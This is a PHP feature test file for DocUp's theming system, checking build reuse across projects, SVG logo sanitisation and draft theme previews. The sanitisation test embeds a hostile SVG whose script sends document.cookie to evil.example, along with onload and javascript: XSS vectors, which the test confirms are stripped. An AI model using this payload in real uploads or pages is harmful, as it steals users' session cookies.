<?php

// SPDX-FileCopyrightText: 2026 The DocUp contributors
// SPDX-License-Identifier: Apache-2.0

declare(strict_types=1);

namespace Tests\Feature\Branding;

use App\Artifacts\Publisher;
use App\Auth\OrganisationContext;
use App\Branding\Assets\AssetIntake;
use App\Branding\Assets\AssetKind;
use App\Branding\CascadeLevel;
use App\Branding\ColourScheme;
use App\Branding\DeliveredTheme;
use App\Branding\ThemeAssets;
use App\Branding\ThemeDelivery;
use App\Branding\ThemeRevisions;
use App\Branding\ThemeTarget;
use App\Models\Build;
use App\Models\Organisation;
use App\Models\Project;
use App\Models\ProjectVersion;
use App\Support\Uuid;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\Storage;
use Tests\Support\ArchiveWriter;
use Tests\TestCase;
use Tests\Unit\Branding\ContrastGateTest;
use Tests\Unit\Branding\TokenGrammarTest;

/**
 * 🛑 §17's Phase 27 exit criteria, each asserted rather than described.
 *
 * > "Two projects render visibly different chrome from the **same build
 * > artifact** with no rebuild, proven by an unchanged build id. An uploaded
 * > SVG containing script is sanitised and renders via `<img>` from the asset
 * > host. A token value containing `url(`, `var(`, `calc(` or `expression(` is
 * > rejected by the grammar. A 2.9:1 contrast pair **refuses publication**; a
 * > 4.0:1 pair warns. A theme edit is previewable before it affects any
 * > consuming project. 🛑 A login page renders installation branding only,
 * > regardless of which tenant domain the reader arrived from. axe reports zero
 * > WCAG 2.2 AA violations."
 *
 * Four of the seven are here. The grammar and the two contrast ratios are
 * {@see TokenGrammarTest} and
 * {@see ContrastGateTest}, because a grammar and an
 * arithmetic gate are functions and belong in unit tests. The login page is
 * {@see CredentialBrandingRefusalTest}, which needs two tenant domains to be
 * worth anything. axe is `npm run axe`, a CI step, because axe is a Node tool
 * and a Pest test that skipped when Node was absent would be a skipped test.
 */
final class ExitCriteriaTest extends TestCase
{
    use DatabaseTransactions;

    private OrganisationContext $context;

    private Organisation $organisation;

    private Project $first;

    private Project $second;

    private ProjectVersion $firstVersion;

    private ProjectVersion $secondVersion;

    private string $fixtures;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('artifacts');
        Storage::fake('theme-assets');

        $this->fixtures = sys_get_temp_dir().'/docup-branding-'.getmypid();

        if (! is_dir($this->fixtures)) {
            mkdir($this->fixtures, 0o755, true);
        }

        $this->context = app(OrganisationContext::class);
        $this->context->spanAllOrganisations();

        $this->organisation = Organisation::query()->create([
            'name' => 'Two Looks Ltd',
            'slug' => 'two-'.bin2hex(random_bytes(4)),
        ]);

        $this->context->for($this->organisation->id);

        [$this->first, $this->firstVersion] = $this->makeProject('first');
        [$this->second, $this->secondVersion] = $this->makeProject('second');
    }

    protected function tearDown(): void
    {
        $this->context->forget();

        foreach ((array) glob($this->fixtures.'/*') as $file) {
            if (is_string($file)) {
                @unlink($file);
            }
        }

        @rmdir($this->fixtures);

        parent::tearDown();
    }

    /**
     * 🛑 **Exit criterion 1.** "Two projects render visibly different chrome
     * from the **same build artifact** with no rebuild, proven by an unchanged
     * build id."
     *
     * The proof is in four parts and all four matter:
     *
     * 1. **One build row** for both projects, through §8.7.9's reuse publish —
     *    so "the same build artifact" is a fact about the schema and not a
     *    claim about two identical builds.
     * 2. **The injected HTML is byte-identical** for both. §8.15.1 injects
     *    "exactly two **project- and version-agnostic** tags", and this is what
     *    makes rebranding without rebuilding possible at all: the artifact
     *    carries the build id and nothing else.
     * 3. **The delivered themes differ** — different stylesheet URLs, different
     *    content hashes, different compiled CSS. "Visibly different" means the
     *    bytes a browser renders differ.
     * 4. **The build id is unchanged after the theme edit**, and `builds` still
     *    holds one row. That is the "no rebuild" half, and it is asserted after
     *    the change rather than before.
     */
    public function test_two_projects_look_different_from_one_build_with_no_rebuild(): void
    {
        $build = $this->publishOnceAndReuse();
        $buildIdBefore = (string) $build->id;

        /* The same artifact, read back from the store the edge serves from. */
        $document = $this->storedDocument($build);

        $this->assertStringContainsString(
            'content="b='.Uuid::toText($build->id).'"',
            $document,
            'the injected meta must carry the build id (§8.15.1)',
        );

        /*
         * 🛑 And carries nothing else. A project slug in the artifact would
         * defeat §8.7.9's reuse and make the stylesheet project-scoped in the
         * artifact — §8.15.1's own words for why the tags are agnostic.
         */
        $this->assertStringNotContainsString((string) $this->first->slug, $document);
        $this->assertStringNotContainsString((string) $this->second->slug, $document);

        /*
         * Two project themes, published. No build is involved in either.
         *
         * 🛑 Both colours are **pairs**, and the first version of this test
         * supplied scalars — which the §8.14.5 gate refused, correctly, at
         * 2.87:1. A scalar applies in both schemes, so a dark green
         * `color.brand.primary` was judged against the dark scheme's
         * near-black `color.brand.on-primary` default. The gate caught a
         * mistake the author made while writing a test about the gate, which
         * is the best evidence available that it works.
         * {@see ThemePublishTest} asserts that refusal on purpose.
         */
        $this->publishProjectTheme($this->first, [
            'color.brand.primary' => ['light' => '#0f6b35', 'dark' => '#5bd98d'],
            'color.text.link' => ['light' => '#0f6b35', 'dark' => '#5bd98d'],
            'brand.name' => 'First Docs',
            'radius.medium' => '0',
        ]);

        $this->publishProjectTheme($this->second, [
            'color.brand.primary' => ['light' => '#6d28d9', 'dark' => '#c4b5fd'],
            'color.text.link' => ['light' => '#5b21b6', 'dark' => '#c4b5fd'],
            'brand.name' => 'Second Docs',
            'radius.medium' => '16px',
        ]);

        $firstTheme = $this->deliverFor($this->first);
        $secondTheme = $this->deliverFor($this->second);

        $this->assertNotSame(
            $firstTheme->contentHash,
            $secondTheme->contentHash,
            'two projects with different themes must resolve to different content hashes',
        );

        $this->assertNotSame($firstTheme->stylesheetUrl, $secondTheme->stylesheetUrl);

        /* Visibly different: the stylesheet bytes a browser loads differ. */
        $firstCss = (string) Storage::disk('theme-assets')
            ->get('css/'.substr($firstTheme->contentHash, 0, 2).'/'.$firstTheme->contentHash.'.css');
        $secondCss = (string) Storage::disk('theme-assets')
            ->get('css/'.substr($secondTheme->contentHash, 0, 2).'/'.$secondTheme->contentHash.'.css');

        $this->assertStringContainsString('--docup-color-brand-primary: #0f6b35;', $firstCss);
        $this->assertStringContainsString('--docup-color-brand-primary: #6d28d9;', $secondCss);
        $this->assertStringContainsString('--docup-radius-medium: 0;', $firstCss);
        $this->assertStringContainsString('--docup-radius-medium: 16px;', $secondCss);

        /* And the chrome payload differs in the wordmark a reader sees. */
        $this->assertSame('First Docs', $firstTheme->theme->serialised('brand.name'));
        $this->assertSame('Second Docs', $secondTheme->theme->serialised('brand.name'));

        /*
         * 🛑 The whole point, asserted last: nothing was rebuilt. One build
         * row, the same id, and the artifact's bytes untouched.
         */
        $this->assertSame(1, Build::query()->count(), 'a theme edit must not create a build');
        $this->assertSame($buildIdBefore, (string) self::reload($build)->id);
        $this->assertSame($document, $this->storedDocument($build), 'the artifact must not have changed');
    }

    /**
     * 🛑 **Exit criterion 2.** "An uploaded SVG containing script is sanitised
     * and renders via `<img>` from the asset host."
     *
     * Three assertions, because "sanitised" is only half of it: the upload has
     * to **succeed** (§8.14.11 sanitises rather than refuses), the script has
     * to be gone from the stored bytes, and the URL has to be on the asset
     * host under §8.14.11's headers.
     */
    public function test_an_svg_with_script_is_sanitised_and_served_from_the_asset_host(): void
    {
        $hostile = <<<'SVG'
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
              <title>ACME</title>
              <script type="text/javascript">fetch('https://evil.example/?c='+document.cookie)</script>
              <rect width="64" height="64" fill="#0b5cd5" onload="alert(1)"/>
              <circle cx="32" cy="32" r="12" fill="url(https://evil.example/paint.svg#g)"/>
              <image href="https://evil.example/tracker.gif" width="1" height="1"/>
              <a xlink:href="javascript:alert(1)"><text x="4" y="60">ACME</text></a>
            </svg>
            SVG;

        $accepted = AssetIntake::make()->accept(
            bytes: $hostile,
            kind: AssetKind::Logo,
            label: 'ACME wordmark',
            scope: CascadeLevel::Organisation,
            scopeId: (string) $this->organisation->id,
            organisationId: (string) $this->organisation->id,
        );

        /* 1. The upload succeeded and the logo is a row. */
        $this->assertSame('logo', $accepted->asset->kind);
        $this->assertSame('image/svg+xml', $accepted->asset->media_type);
        $this->assertSame('image/svg+xml', $accepted->asset->source_media_type);

        /* And it says what it dropped, so an operator is not left guessing. */
        $this->assertContains('<script>', $accepted->removed);
        $this->assertContains('an event handler (onload)', $accepted->removed);
        $this->assertContains('<image>', $accepted->removed);
        $this->assertContains('<a>', $accepted->removed);

        /* 2. The stored bytes are DocUp's own, and carry none of it. */
        $stored = (string) ThemeAssets::store()->get($accepted->asset->content_hash, 'svg');

        $this->assertStringNotContainsString('script', $stored);
        $this->assertStringNotContainsString('onload', $stored);
        $this->assertStringNotContainsString('evil.example', $stored);
        $this->assertStringNotContainsString('javascript:', $stored);
        $this->assertStringNotContainsString('xlink', $stored);

        /* The logo still draws: the shapes and the accessible name survived. */
        $this->assertStringContainsString('<rect', $stored);
        $this->assertStringContainsString('<circle', $stored);
        $this->assertStringContainsString('<title>ACME</title>', $stored);
        $this->assertStringContainsString('fill="#0b5cd5"', $stored);

        /* 3. And it is served from the asset host, via <img src>. */
        $url = ThemeAssets::urlFor($accepted->asset);

        /*
         * The origin is read into a local and narrowed, because an empty one
         * would make `assertStringStartsWith` vacuously true — every string
         * starts with nothing — and this assertion is the exit criterion's
         * "from the asset host" half.
         */
        $origin = ThemeAssets::assetOrigin();
        $this->assertNotEmpty($origin, 'no asset origin is configured, so this assertion would pass for free');
        $this->assertStringContainsString($origin, $url);
        $this->assertSame(0, strpos($url, $origin));
        $this->assertStringEndsWith($accepted->asset->content_hash.'.svg', $url);

        $response = $this->get($url);

        $response->assertOk();
        $response->assertHeader('Content-Type', 'image/svg+xml');
        $response->assertHeader('Content-Security-Policy', "default-src 'none'; sandbox");
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertSame($stored, $response->getContent());

        /*
         * 🛑 "no cookies" is part of §8.14.11's sentence, so it is asserted
         * rather than assumed from the absence of a middleware group.
         */
        $this->assertSame([], $response->headers->getCookies());
        $this->assertNull($response->headers->get('Set-Cookie'));
    }

    /**
     * 🛑 **Exit criterion 5.** "A theme edit is previewable before it affects
     * any consuming project."
     *
     * Both halves. A preview that showed the draft would satisfy a careless
     * test; what §8.14.6 asks for is that the **consuming project is
     * unaffected** while the preview exists, so the live resolution is
     * asserted before and after the draft is saved.
     */
    public function test_a_draft_is_previewable_and_changes_nothing_until_published(): void
    {
        $this->publishProjectTheme($this->first, ['color.brand.primary' => ['light' => '#0f6b35', 'dark' => '#5bd98d']]);

        $liveBefore = $this->deliverFor($this->first);
        $this->assertSame('#0f6b35', $liveBefore->theme->serialised('color.brand.primary'));

        $draft = ThemeRevisions::make((string) $this->organisation->id, (string) $this->first->id)->draft(
            level: CascadeLevel::Project,
            scopeId: (string) $this->first->id,
            organisationId: (string) $this->organisation->id,
            tokens: ['color.brand.primary' => ['light' => '#b3261e', 'dark' => '#ff8f85']],
        );

        $this->assertSame('draft', $draft->state);

        /* The preview shows the draft... */
        $preview = ThemeDelivery::make((string) $this->organisation->id, (string) $this->first->id)
            ->previewOf(new ThemeTarget(
                organisationId: (string) $this->organisation->id,
                projectId: (string) $this->first->id,
            ), $draft);

        $this->assertSame('#b3261e', $preview->theme->serialised('color.brand.primary'));

        /* ...and the project still serves what it served before. */
        $liveAfter = $this->deliverFor($this->first);

        $this->assertSame('#0f6b35', $liveAfter->theme->serialised('color.brand.primary'));
        $this->assertSame($liveBefore->contentHash, $liveAfter->contentHash);
        $this->assertNotSame($preview->contentHash, $liveAfter->contentHash);

        /* Publishing is what moves it. */
        ThemeRevisions::make((string) $this->organisation->id, (string) $this->first->id)->publish($draft);

        $this->assertSame('#b3261e', $this->deliverFor($this->first)->theme->serialised('color.brand.primary'));
    }

    /**
     * 🛑 A preview resolves the draft at **its own rung** with every other rung
     * published — which is the only reading that answers the question an
     * operator is asking.
     *
     * A preview of a project draft must still inherit the organisation's
     * published values, or it shows a page nobody is about to publish.
     */
    public function test_a_preview_keeps_every_other_rung_as_published(): void
    {
        $this->publishOrganisationTheme(['color.surface.page' => ['light' => '#fffdf5', 'dark' => '#1a1710']]);

        $draft = ThemeRevisions::make((string) $this->organisation->id, (string) $this->first->id)->draft(
            level: CascadeLevel::Project,
            scopeId: (string) $this->first->id,
            organisationId: (string) $this->organisation->id,
            tokens: ['color.brand.primary' => ['light' => '#b3261e', 'dark' => '#ff8f85']],
        );

        $preview = ThemeDelivery::make((string) $this->organisation->id, (string) $this->first->id)
            ->previewOf(new ThemeTarget(
                organisationId: (string) $this->organisation->id,
                projectId: (string) $this->first->id,
            ), $draft);

        $this->assertSame('#b3261e', $preview->theme->serialised('color.brand.primary'));
        $this->assertSame('#fffdf5', $preview->theme->serialised('color.surface.page'));
        $this->assertSame('#1a1710', $preview->theme->serialised('color.surface.page', ColourScheme::Dark));
        $this->assertSame(CascadeLevel::Organisation, $preview->theme->origin('color.surface.page'));
    }

    // ------------------------------------------------------------- the fixtures

    /** @return array{Project, ProjectVersion} */
    private function makeProject(string $name): array
    {
        $project = Project::query()->create([
            'slug' => $name.'-'.bin2hex(random_bytes(4)),
            'name' => ucfirst($name).' Project',
            'visibility' => 'public',
        ]);

        $version = new ProjectVersion;
        $version->forceFill([
            'organisation_id' => $this->organisation->id,
            'project_id' => $project->id,
            'slug' => 'latest',
            'kind' => 'channel',
            'language' => 'en',
            'visibility' => 'public',
        ])->save();

        $project->forceFill(['default_version_id' => $version->id])->save();

        return [$project, $version];
    }

    /**
     * 🛑 One build, published to both versions through §8.7.9's reuse.
     *
     * `publishExistingBuild()` is the mechanism the specification names for
     * "one repository feeding many projects build **once**", so using it here
     * means the test asserts the real arrangement rather than a staged one.
     */
    private function publishOnceAndReuse(): Build
    {
        $archive = (new ArchiveWriter)
            ->add('html/index.html', '<!doctype html><html><head><title>Shared</title></head><body>shared</body></html>')
            ->toTarGz($this->fixtures.'/shared.tar.gz');

        $publisher = app(Publisher::class);
        $publisher->publishUpload($this->firstVersion, $archive);

        $build = Build::query()->firstOrFail();

        $publisher->publishExistingBuild($this->secondVersion, $build);

        $this->assertSame(1, Build::query()->count(), 'the reuse publish must not create a second build');

        return $build;
    }

    /**
     * One build, re-read from the database.
     *
     * 🛑 Through a typed helper rather than `->fresh()`, which widens to a
     * union Larastan cannot narrow — so an assertion on `->id` would compile
     * against a collection.
     */
    private static function reload(Build $build): Build
    {
        $reloaded = Build::query()->whereKey($build->getKey())->first();

        if (! $reloaded instanceof Build) {
            throw new \RuntimeException('the build under test disappeared');
        }

        return $reloaded;
    }

    /** The injected document, read from the store the edge serves. */
    private function storedDocument(Build $build): string
    {
        $path = 'builds/'.Uuid::toText($build->id).'/html/index.html';

        return (string) Storage::disk('artifacts')->get($path);
    }

    /** @param array<string, mixed> $tokens */
    private function publishProjectTheme(Project $project, array $tokens): void
    {
        $revisions = ThemeRevisions::make((string) $this->organisation->id, (string) $project->id);

        $revisions->publish($revisions->draft(
            level: CascadeLevel::Project,
            scopeId: (string) $project->id,
            organisationId: (string) $this->organisation->id,
            tokens: $tokens,
        ));
    }

    /** @param array<string, mixed> $tokens */
    private function publishOrganisationTheme(array $tokens): void
    {
        $revisions = ThemeRevisions::make((string) $this->organisation->id);

        $revisions->publish($revisions->draft(
            level: CascadeLevel::Organisation,
            scopeId: (string) $this->organisation->id,
            organisationId: (string) $this->organisation->id,
            tokens: $tokens,
        ));
    }

    private function deliverFor(Project $project): DeliveredTheme
    {
        return ThemeDelivery::make((string) $this->organisation->id, (string) $project->id)
            ->deliver(new ThemeTarget(
                organisationId: (string) $this->organisation->id,
                projectId: (string) $project->id,
            ));
    }
}
